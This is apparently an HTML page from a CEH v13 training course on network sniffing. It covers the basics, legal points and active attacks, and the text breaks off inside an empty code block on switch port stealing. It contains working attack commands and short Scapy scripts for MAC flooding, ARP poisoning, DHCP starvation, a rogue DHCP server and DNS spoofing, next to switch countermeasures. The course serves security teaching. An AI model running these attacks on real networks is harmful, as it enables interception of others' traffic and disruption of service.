<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CEH v13 Module 8: Sniffing - Interactive Learning Platform</title>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --success-color: #27ae60;
            --warning-color: #f39c12;
            --dark-bg: #1a1a1a;
            --card-bg: #2d3748;
            --text-light: #ecf0f1;
            --border-color: #4a5568;
            --sniff-primary: #00ff88;
            --sniff-secondary: #0080ff;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c4a6e, #1e3a8a, #581c87);
            color: var(--text-light);
            line-height: 1.6;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin: 40px 0;
            position: relative;
        }

        .header h1 {
            font-size: 3.5em;
            font-weight: 700;
            background: linear-gradient(45deg, var(--sniff-primary), var(--sniff-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
        }

        .module-info {
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
            border: 1px solid var(--sniff-primary);
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            text-align: center;
        }

        .navigation {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin: 30px 0;
        }

        .nav-btn {
            background: linear-gradient(135deg, var(--sniff-primary), var(--sniff-secondary));
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 14px;
        }

        .nav-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.3);
        }

        .nav-btn.active {
            background: linear-gradient(135deg, var(--accent-color), #c0392b);
            box-shadow: 0 0 20px rgba(231, 76, 60, 0.5);
        }

        .module-section {
            display: none;
            animation: fadeIn 0.6s ease-in-out;
        }

        .module-section.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: rgba(45, 55, 72, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border-color);
            border-radius: 15px;
            padding: 30px;
            margin: 20px 0;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            border-color: var(--sniff-primary);
            box-shadow: 0 15px 40px rgba(0, 255, 136, 0.1);
        }

        .section-title {
            font-size: 2.5em;
            margin-bottom: 30px;
            text-align: center;
            color: var(--sniff-primary);
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }

        .subsection {
            margin: 30px 0;
            padding: 20px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            border-left: 4px solid var(--sniff-primary);
        }

        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin: 25px 0;
        }

        .grid-3 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .feature-card {
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 128, 255, 0.1));
            border: 1px solid var(--sniff-primary);
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .feature-card:hover {
            transform: scale(1.05);
            border-color: var(--sniff-secondary);
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.2);
        }

        .code-block {
            background: #1a1a1a;
            border: 1px solid var(--sniff-primary);
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            position: relative;
        }

        .code-block::before {
            content: '📟 Terminal';
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--dark-bg);
            padding: 5px 10px;
            font-size: 12px;
            color: var(--sniff-primary);
        }

        .tool-showcase {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin: 25px 0;
        }

        .tool-card {
            background: linear-gradient(135deg, #1e293b, #334155);
            border: 1px solid var(--sniff-primary);
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s ease;
        }

        .tool-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
        }

        .quiz-container {
            background: linear-gradient(135deg, #2d1b69, #11047a);
            border-radius: 15px;
            padding: 30px;
            margin: 20px 0;
        }

        .quiz-question {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 25px;
            margin: 20px 0;
            border-left: 4px solid var(--sniff-primary);
        }

        .quiz-options {
            display: grid;
            gap: 10px;
            margin: 20px 0;
        }

        .quiz-option {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .quiz-option:hover {
            background: rgba(0, 255, 136, 0.1);
            border-color: var(--sniff-primary);
        }

        .quiz-option.selected {
            background: rgba(0, 255, 136, 0.2);
            border-color: var(--sniff-primary);
        }

        .quiz-option.correct {
            background: rgba(39, 174, 96, 0.3);
            border-color: var(--success-color);
        }

        .quiz-option.incorrect {
            background: rgba(231, 76, 60, 0.3);
            border-color: var(--accent-color);
        }

        .btn {
            background: linear-gradient(135deg, var(--secondary-color), #2980b9);
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 5px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
        }

        .btn-success {
            background: linear-gradient(135deg, var(--success-color), #229954);
        }

        .btn-warning {
            background: linear-gradient(135deg, var(--warning-color), #e67e22);
        }

        .btn-danger {
            background: linear-gradient(135deg, var(--accent-color), #c0392b);
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--sniff-primary), var(--sniff-secondary));
            transition: width 0.5s ease;
            width: 0%;
        }

        .lab-simulator {
            background: #0a0a0a;
            border: 2px solid var(--sniff-primary);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            font-family: 'Courier New', monospace;
        }

        .terminal {
            background: #000;
            color: var(--sniff-primary);
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            min-height: 300px;
            overflow-y: auto;
        }

        .terminal-prompt {
            color: var(--sniff-secondary);
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.1;
        }

        .matrix-line {
            position: absolute;
            color: var(--sniff-primary);
            font-family: 'Courier New', monospace;
            font-size: 14px;
            animation: matrixFall 8s linear infinite;
        }

        @keyframes matrixFall {
            0% { transform: translateY(-100vh); opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }

        .resource-link {
            color: var(--sniff-secondary);
            text-decoration: none;
            border-bottom: 1px dotted var(--sniff-secondary);
            transition: all 0.3s ease;
        }

        .resource-link:hover {
            color: var(--sniff-primary);
            border-bottom-color: var(--sniff-primary);
        }

        .attack-flow {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin: 25px 0;
        }

        .flow-step {
            background: linear-gradient(135deg, #1e293b, #475569);
            border: 1px solid var(--sniff-primary);
            border-radius: 10px;
            padding: 15px 20px;
            text-align: center;
            min-width: 150px;
            position: relative;
        }

        .flow-arrow {
            color: var(--sniff-primary);
            font-size: 24px;
            margin: 0 10px;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: linear-gradient(135deg, var(--card-bg), #1a202c);
            margin: 5% auto;
            padding: 30px;
            border: 1px solid var(--sniff-primary);
            border-radius: 15px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }

        .close {
            color: var(--text-light);
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover {
            color: var(--accent-color);
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            z-index: 1001;
            transform: translateX(400px);
            transition: transform 0.3s ease;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification.success {
            background: linear-gradient(135deg, var(--success-color), #229954);
        }

        .notification.error {
            background: linear-gradient(135deg, var(--accent-color), #c0392b);
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 2.5em;
            }
            
            .section-title {
                font-size: 2em;
            }
            
            .grid-2, .grid-3 {
                grid-template-columns: 1fr;
            }
            
            .navigation {
                flex-direction: column;
                align-items: center;
            }
        }

        .interactive-demo {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--sniff-primary);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .demo-controls {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            flex-wrap: wrap;
        }

        .demo-output {
            background: #000;
            color: var(--sniff-primary);
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            min-height: 200px;
            white-space: pre-wrap;
            overflow-y: auto;
        }

        .highlight {
            background: rgba(0, 255, 136, 0.2);
            padding: 2px 4px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrixBg"></div>
    
    <div class="container">
        <header class="header">
            <h1>🔍 CEH v13 Module 8: Sniffing</h1>
            <div class="module-info">
                <h3>🎯 Network Traffic Analysis & Packet Sniffing Mastery</h3>
                <p>Master the art of packet capture, analysis, and network monitoring. Learn both offensive sniffing techniques and defensive countermeasures.</p>
                <div style="margin-top: 15px;">
                    <span class="highlight">⏱️ Duration: 3+ Hours</span> | 
                    <span class="highlight">📚 Comprehensive Content</span> | 
                    <span class="highlight">🛠️ Hands-on Labs</span> | 
                    <span class="highlight">🔬 Interactive Simulations</span>
                </div>
            </div>
        </header>

        <nav class="navigation">
            <button class="nav-btn active" onclick="showSection('overview')">📋 Overview</button>
            <button class="nav-btn" onclick="showSection('fundamentals')">🔍 Fundamentals</button>
            <button class="nav-btn" onclick="showSection('active-sniffing')">⚡ Active Sniffing</button>
            <button class="nav-btn" onclick="showSection('attacks')">🎯 Attack Techniques</button>
            <button class="nav-btn" onclick="showSection('tools')">🛠️ Tools & Analysis</button>
            <button class="nav-btn" onclick="showSection('countermeasures')">🛡️ Countermeasures</button>
            <button class="nav-btn" onclick="showSection('labs')">🧪 Hands-on Labs</button>
            <button class="nav-btn" onclick="showSection('quiz')">📝 Assessment</button>
            <button class="nav-btn" onclick="showSection('resources')">📚 Resources</button>
        </nav>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>

        <!-- Overview Section -->
        <div id="overview" class="module-section active">
            <h2 class="section-title">📋 Module Overview & Learning Objectives</h2>
            
            <div class="card">
                <h3>🎯 What You'll Master in This Module</h3>
                <p>This comprehensive module covers all aspects of network sniffing, from basic packet capture to advanced attack techniques and defensive measures. You'll gain hands-on experience with industry-standard tools and learn to think like both an attacker and defender.</p>

                <div class="grid-3" style="margin-top: 25px;">
                    <div class="feature-card">
                        <h4>🔍 Sniffing Fundamentals</h4>
                        <p>Understand passive vs active sniffing, network architectures, and packet capture basics</p>
                    </div>
                    <div class="feature-card">
                        <h4>⚡ Active Attack Techniques</h4>
                        <p>Master ARP poisoning, MAC flooding, DHCP attacks, and other active sniffing methods</p>
                    </div>
                    <div class="feature-card">
                        <h4>🛠️ Professional Tools</h4>
                        <p>Hands-on with Wireshark, tcpdump, Ettercap, Cain & Abel, and other industry tools</p>
                    </div>
                    <div class="feature-card">
                        <h4>🎯 Attack Scenarios</h4>
                        <p>Real-world attack simulations including DNS poisoning, session hijacking, and more</p>
                    </div>
                    <div class="feature-card">
                        <h4>🛡️ Defense Strategies</h4>
                        <p>Implement detection methods, network segmentation, and sniffing countermeasures</p>
                    </div>
                    <div class="feature-card">
                        <h4>🔬 Analysis Skills</h4>
                        <p>Advanced packet analysis, protocol dissection, and traffic pattern recognition</p>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>📚 Module Structure & Timeline</h3>
                <div class="subsection">
                    <h4>Part 1: Foundation (45 minutes)</h4>
                    <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                        <li>Sniffing concepts and terminology</li>
                        <li>Network architectures (Hub vs Switch)</li>
                        <li>Passive vs Active sniffing methods</li>
                        <li>Legal and ethical considerations</li>
                    </ul>
                </div>

                <div class="subsection">
                    <h4>Part 2: Active Sniffing Techniques (60 minutes)</h4>
                    <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                        <li>MAC flooding and CAM table attacks</li>
                        <li>ARP poisoning and spoofing</li>
                        <li>DHCP starvation and rogue servers</li>
                        <li>DNS poisoning and spoofing</li>
                        <li>Switch port stealing techniques</li>
                    </ul>
                </div>

                <div class="subsection">
                    <h4>Part 3: Tools & Analysis (60 minutes)</h4>
                    <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                        <li>Wireshark mastery and advanced filtering</li>
                        <li>Command-line tools (tcpdump, netstat)</li>
                        <li>Attack automation tools (Ettercap, Bettercap)</li>
                        <li>Packet analysis and protocol dissection</li>
                    </ul>
                </div>

                <div class="subsection">
                    <h4>Part 4: Defense & Assessment (45 minutes)</h4>
                    <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                        <li>Detection and prevention methods</li>
                        <li>Network security implementations</li>
                        <li>Hands-on lab exercises</li>
                        <li>Comprehensive assessment</li>
                    </ul>
                </div>
            </div>

            <div class="card">
                <h3>🎓 Prerequisites & Preparation</h3>
                <div class="grid-2">
                    <div>
                        <h4>📋 Required Knowledge</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li>TCP/IP networking fundamentals</li>
                            <li>OSI model understanding</li>
                            <li>Basic network protocols (HTTP, DNS, DHCP)</li>
                            <li>Command line proficiency</li>
                            <li>Network hardware concepts</li>
                        </ul>
                    </div>
                    <div>
                        <h4>🛠️ Recommended Setup</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li>Virtual lab environment (VirtualBox/VMware)</li>
                            <li>Kali Linux or similar penetration testing OS</li>
                            <li>Windows 10/11 target systems</li>
                            <li>Network simulator (GNS3 optional)</li>
                            <li>Packet capture samples for analysis</li>
                        </ul>
                    </div>
                </div>
            </div>

            <button class="btn btn-success" onclick="showSection('fundamentals')">Start Learning Journey →</button>
        </div>

        <!-- Fundamentals Section -->
        <div id="fundamentals" class="module-section">
            <h2 class="section-title">🔍 Sniffing Fundamentals</h2>
            
            <div class="card">
                <h3>📖 What is Network Sniffing?</h3>
                <p>Network sniffing, also known as packet sniffing or network monitoring, is the process of capturing, analyzing, and interpreting network traffic data packets as they traverse a network. This technique is fundamental to network troubleshooting, security analysis, and understanding network behavior.</p>
                
                <div class="subsection">
                    <h4>🎯 Key Concepts</h4>
                    <div class="grid-2">
                        <div class="feature-card">
                            <h4>📡 Packet Capture</h4>
                            <p>The process of intercepting and logging network traffic that passes over a digital network</p>
                        </div>
                        <div class="feature-card">
                            <h4>🔬 Traffic Analysis</h4>
                            <p>Examining captured packets to understand network behavior, identify issues, or detect anomalies</p>
                        </div>
                        <div class="feature-card">
                            <h4>🌐 Promiscuous Mode</h4>
                            <p>Network interface mode that captures all traffic on the network segment, not just traffic destined for the host</p>
                        </div>
                        <div class="feature-card">
                            <h4>📊 Protocol Analysis</h4>
                            <p>Deep inspection of network protocols to understand communication patterns and data flow</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🏗️ Network Architectures & Sniffing Capabilities</h3>
                
                <div class="grid-2">
                    <div class="subsection">
                        <h4>🔧 Hub-Based Networks (Legacy)</h4>
                        <p><strong>Architecture:</strong> All devices connected to a single collision domain</p>
                        <ul style="margin: 15px 0; padding-left: 20px;">
                            <li><strong>Traffic Flow:</strong> All packets broadcast to every port</li>
                            <li><strong>Sniffing Type:</strong> Passive sniffing only</li>
                            <li><strong>Detection Difficulty:</strong> Very hard to detect</li>
                            <li><strong>Security Level:</strong> Very low - all traffic visible</li>
                        </ul>
                        
                        <div class="code-block">
Device A ──┐
           │
Device B ──┼── HUB ── All traffic visible to all devices
           │
Device C ──┘</div>
                    </div>

                    <div class="subsection">
                        <h4>🔀 Switch-Based Networks (Modern)</h4>
                        <p><strong>Architecture:</strong> Intelligent switching with MAC address tables</p>
                        <ul style="margin: 15px 0; padding-left: 20px;">
                            <li><strong>Traffic Flow:</strong> Unicast traffic sent only to destination</li>
                            <li><strong>Sniffing Type:</strong> Requires active techniques</li>
                            <li><strong>Detection Difficulty:</strong> Moderate to detect</li>
                            <li><strong>Security Level:</strong> Higher - segmented traffic</li>
                        </ul>

                        <div class="code-block">
Device A ──┐
           │    MAC Table:
Device B ──┼── SWITCH    A: Port 1
           │             B: Port 2  
Device C ──┘             C: Port 3</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>⚖️ Passive vs Active Sniffing</h3>
                
                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🔇 Passive Sniffing</h4>
                        <p><strong>Definition:</strong> Listening to network traffic without sending any packets</p>
                        
                        <h5>Characteristics:</h5>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>No network traffic generated</li>
                            <li>Works only on hub-based networks</li>
                            <li>Extremely difficult to detect</li>
                            <li>Limited to shared collision domains</li>
                        </ul>

                        <h5>Use Cases:</h5>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Network monitoring on legacy systems</li>
                            <li>Wireless network monitoring</li>
                            <li>Covert surveillance</li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>⚡ Active Sniffing</h4>
                        <p><strong>Definition:</strong> Injecting packets to manipulate network devices and capture traffic</p>
                        
                        <h5>Characteristics:</h5>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Generates network traffic</li>
                            <li>Required for switched networks</li>
                            <li>Potentially detectable</li>
                            <li>Can affect network performance</li>
                        </ul>

                        <h5>Techniques:</h5>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>MAC flooding attacks</li>
                            <li>ARP poisoning/spoofing</li>
                            <li>DHCP attacks</li>
                            <li>DNS poisoning</li>
                        </ul>
                    </div>
                </div>

                <div class="attack-flow">
                    <div class="flow-step">📡 Monitor Network</div>
                    <div class="flow-arrow">→</div>
                    <div class="flow-step">🎯 Identify Targets</div>
                    <div class="flow-arrow">→</div>
                    <div class="flow-step">⚡ Inject Attack Packets</div>
                    <div class="flow-arrow">→</div>
                    <div class="flow-step">🔍 Capture Traffic</div>
                    <div class="flow-arrow">→</div>
                    <div class="flow-step">📊 Analyze Data</div>
                </div>
            </div>

            <div class="card">
                <h3>⚖️ Legal and Ethical Considerations</h3>
                
                <div class="subsection" style="background: rgba(231, 76, 60, 0.1); border-left-color: #e74c3c;">
                    <h4>⚠️ Legal Requirements</h4>
                    <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                        <li><strong>Written Authorization:</strong> Always obtain explicit permission before sniffing</li>
                        <li><strong>Scope Limitations:</strong> Only monitor networks you own or have permission to test</li>
                        <li><strong>Data Privacy:</strong> Respect privacy laws and data protection regulations</li>
                        <li><strong>Professional Context:</strong> Use sniffing for legitimate security testing only</li>
                    </ul>
                </div>

                <div class="subsection" style="background: rgba(39, 174, 96, 0.1); border-left-color: #27ae60;">
                    <h4>✅ Legitimate Use Cases</h4>
                    <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                        <li><strong>Network Troubleshooting:</strong> Diagnosing connectivity and performance issues</li>
                        <li><strong>Security Analysis:</strong> Identifying vulnerabilities and attack patterns</li>
                        <li><strong>Performance Monitoring:</strong> Analyzing bandwidth usage and traffic patterns</li>
                        <li><strong>Forensic Investigation:</strong> Collecting evidence during security incidents</li>
                        <li><strong>Penetration Testing:</strong> Authorized security assessments</li>
                    </ul>
                </div>
            </div>

            <button class="btn btn-success" onclick="showSection('active-sniffing')">Next: Active Sniffing Techniques →</button>
        </div>

        <!-- Active Sniffing Section -->
        <div id="active-sniffing" class="module-section">
            <h2 class="section-title">⚡ Active Sniffing Techniques</h2>
            
            <div class="card">
                <h3>🌪️ MAC Flooding Attacks</h3>
                <p>MAC flooding exploits the limited size of a switch's Content Addressable Memory (CAM) table by overwhelming it with fake MAC addresses, causing the switch to fail open and behave like a hub.</p>
                
                <div class="subsection">
                    <h4>🎯 Attack Mechanics</h4>
                    <div class="attack-flow">
                        <div class="flow-step">🔍 Connect to Switch</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">📡 Generate Fake MACs</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">💥 Flood CAM Table</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">🔄 Switch Fails Open</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">📊 Capture All Traffic</div>
                    </div>

                    <div class="code-block">
# MAC Flooding with macof (part of dsniff)
macof -i eth0 -n 1000

# Alternative with Scapy
from scapy.all import *
import random

def mac_flood():
    for i in range(1000):
        src_mac = RandMAC()
        dst_mac = RandMAC()
        packet = Ether(src=src_mac, dst=dst_mac)/IP()/ICMP()
        sendp(packet, iface="eth0", verbose=0)</div>
                </div>

                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🎯 Impact</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Switch becomes a hub</li>
                            <li>All traffic becomes visible</li>
                            <li>Network performance degradation</li>
                            <li>Adjacent switches may be affected</li>
                        </ul>
                    </div>
                    <div class="feature-card">
                        <h4>🛡️ Countermeasures</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Port security configuration</li>
                            <li>MAC address limits per port</li>
                            <li>Static MAC address assignment</li>
                            <li>Network monitoring and alerting</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🎭 ARP Poisoning/Spoofing</h3>
                <p>ARP poisoning manipulates the Address Resolution Protocol to associate the attacker's MAC address with another host's IP address, redirecting traffic through the attacker's system.</p>
                
                <div class="subsection">
                    <h4>📚 ARP Protocol Basics</h4>
                    <p>ARP resolves IP addresses to MAC addresses on local network segments. It's a stateless protocol that accepts unsolicited responses, making it vulnerable to spoofing attacks.</p>

                    <div class="code-block">
Normal ARP Process:
Host A (192.168.1.10): "Who has 192.168.1.1? Tell 192.168.1.10"
Gateway (192.168.1.1): "192.168.1.1 is at 00:11:22:33:44:55"

ARP Poisoning Attack:
Attacker: "192.168.1.1 is at AA:BB:CC:DD:EE:FF" (Fake response)
Host A now sends traffic to attacker instead of gateway</div>
                </div>

                <div class="interactive-demo">
                    <h4>🔬 Interactive ARP Poisoning Demo</h4>
                    <div class="demo-controls">
                        <button class="btn" onclick="startARPDemo()">Start ARP Attack</button>
                        <button class="btn btn-warning" onclick="stopARPDemo()">Stop Attack</button>
                        <button class="btn btn-danger" onclick="clearARPDemo()">Clear Output</button>
                    </div>
                    <div class="demo-output" id="arpDemoOutput">
Click "Start ARP Attack" to see the step-by-step process...
                    </div>
                </div>

                <div class="tool-showcase">
                    <div class="tool-card">
                        <h4>🔧 Ettercap</h4>
                        <p>Comprehensive suite for ARP poisoning and MITM attacks</p>
                        <div class="code-block">
# ARP poisoning with Ettercap
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//</div>
                    </div>

                    <div class="tool-card">
                        <h4>⚡ Bettercap</h4>
                        <p>Modern, modular network attack framework</p>
                        <div class="code-block">
# ARP spoofing with Bettercap
net.probe on
set arp.spoof.targets 192.168.1.10
arp.spoof on</div>
                    </div>

                    <div class="tool-card">
                        <h4>🐍 Scapy</h4>
                        <p>Python-based packet manipulation tool</p>
                        <div class="code-block">
# Custom ARP poisoning script
from scapy.all import *

target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"
target_mac = getmacbyip(target_ip)

# Create poisoned ARP packet
arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=get_if_hwaddr("eth0"))
send(arp_response, verbose=0)</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🌐 DHCP Attacks</h3>
                
                <div class="grid-2">
                    <div class="subsection">
                        <h4>💥 DHCP Starvation Attack</h4>
                        <p>Exhausts the DHCP server's IP address pool by requesting all available addresses with spoofed MAC addresses.</p>
                        
                        <div class="code-block">
# DHCP Starvation with Yersinia
yersinia dhcp -attack 1

# Manual DHCP starvation
for i in {1..254}; do
    dhclient -v eth0
    sleep 1
done</div>

                        <h5>Attack Steps:</h5>
                        <ol style="margin: 10px 0; padding-left: 20px;">
                            <li>Generate random MAC addresses</li>
                            <li>Send DHCP Discover requests</li>
                            <li>Accept all offered IP addresses</li>
                            <li>Exhaust DHCP pool</li>
                            <li>Legitimate clients can't get IPs</li>
                        </ol>
                    </div>

                    <div class="subsection">
                        <h4>🕳️ Rogue DHCP Server</h4>
                        <p>Deploy a malicious DHCP server to provide false network configuration to clients.</p>
                        
                        <div class="code-block">
# Setup rogue DHCP server
# /etc/dhcp/dhcpd.conf
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.50 192.168.1.100;
    option routers 192.168.1.254;        # Attacker's IP
    option domain-name-servers 192.168.1.254;  # Attacker's DNS
}

# Start rogue DHCP service
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid eth0</div>

                        <h5>Malicious Configurations:</h5>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Route traffic through attacker</li>
                            <li>Provide malicious DNS servers</li>
                            <li>Set up proxy configurations</li>
                            <li>Capture authentication attempts</li>
                        </ul>
                    </div>
                </div>

                <div class="subsection" style="background: rgba(0, 255, 136, 0.1);">
                    <h4>🛡️ DHCP Attack Countermeasures</h4>
                    <div class="grid-2">
                        <div>
                            <h5>DHCP Snooping</h5>
                            <div class="code-block">
# Cisco switch DHCP snooping
ip dhcp snooping
ip dhcp snooping vlan 1
interface GigabitEthernet0/1
ip dhcp snooping trust</div>
                        </div>
                        <div>
                            <h5>Port Security</h5>
                            <div class="code-block">
# Limit MAC addresses per port
interface GigabitEthernet0/2
switchport port-security
switchport port-security maximum 1
switchport port-security violation shutdown</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🌍 DNS Poisoning Attacks</h3>
                <p>DNS poisoning manipulates Domain Name System responses to redirect users to malicious servers or websites.</p>
                
                <div class="grid-3">
                    <div class="feature-card">
                        <h4>🏠 Intranet DNS Spoofing</h4>
                        <p>Target internal network DNS queries</p>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li>Requires LAN access</li>
                            <li>Works with ARP poisoning</li>
                            <li>Intercepts DNS queries</li>
                            <li>Returns false IP addresses</li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>🌐 Internet DNS Spoofing</h4>
                        <p>Target external DNS queries</p>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li>Requires traffic interception</li>
                            <li>Race condition attacks</li>
                            <li>Cache poisoning</li>
                            <li>BGP hijacking</li>
                        </ul>
                    </div>

                    <div class="feature-card">
                        <h4>🔄 DNS Cache Poisoning</h4>
                        <p>Corrupt DNS resolver cache</p>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li>Target DNS recursors</li>
                            <li>Inject false records</li>
                            <li>Long-term impact</li>
                            <li>Affects multiple users</li>
                        </ul>
                    </div>
                </div>

                <div class="code-block">
# DNS spoofing with Ettercap
# Create dns_spoof file
echo "*.example.com A 192.168.1.100" > dns_spoof
echo "*.google.com A 192.168.1.100" >> dns_spoof

# Start DNS spoofing
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.0/24//</div>

                <div class="interactive-demo">
                    <h4>🔬 DNS Poisoning Impact Demo</h4>
                    <div class="demo-controls">
                        <button class="btn" onclick="demonstrateDNSPoisoning()">Show DNS Poisoning</button>
                        <button class="btn btn-warning" onclick="showDNSDefenses()">Show Defenses</button>
                    </div>
                    <div class="demo-output" id="dnsPoisoningOutput">
Click above to see DNS poisoning attack flow...
                    </div>
                </div>
            </div>

            <button class="btn btn-success" onclick="showSection('attacks')">Next: Advanced Attack Techniques →</button>
        </div>

        <!-- Attacks Section -->
        <div id="attacks" class="module-section">
            <h2 class="section-title">🎯 Advanced Attack Techniques</h2>
            
            <div class="card">
                <h3>🔄 Switch Port Stealing</h3>
                <p>A sophisticated technique that exploits the way switches learn MAC addresses to steal another host's switch port and intercept their traffic.</p>
                
                <div class="subsection">
                    <h4>🎯 Attack Methodology</h4>
                    <div class="attack-flow">
                        <div class="flow-step">🔍 Identify Target MAC</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">📡 Send Frame with Target MAC</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">🔄 Switch Updates CAM Table</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">📊 Receive Target's Traffic</div>
                    </div>

                    <div class="code-block">
